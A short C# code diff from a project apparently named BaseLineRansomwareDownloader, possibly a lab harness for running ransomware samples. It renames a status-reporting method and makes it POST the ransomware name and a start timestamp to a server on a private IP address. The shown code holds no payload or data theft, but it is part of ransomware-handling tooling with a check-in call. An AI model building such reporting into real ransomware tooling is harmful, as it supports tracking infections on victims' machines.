@@ -71,16 +71,17 @@ namespace BaseLineRansomwareDownloader
         }
 
         //Informs the server that the data has been downloaded, thus creating an empty 
-        public static async void postBaseFetched()
+        public static async void postBaseStarted()
         {
             var values = new Dictionary<string, string>
             {
-                {"RansomwareName",  NAMEONTEST}
+                {"RansomwareName",  NAMEONTEST},
+                {"Started", DateTime.Now.ToString() }
             };
 
             var content = new FormUrlEncodedContent(values);
 
-            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postbasefetched", content).Result;
+            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postbasestarted", content).Result;
 
             var responseString = await response.Content.ReadAsByteArrayAsync();
         }
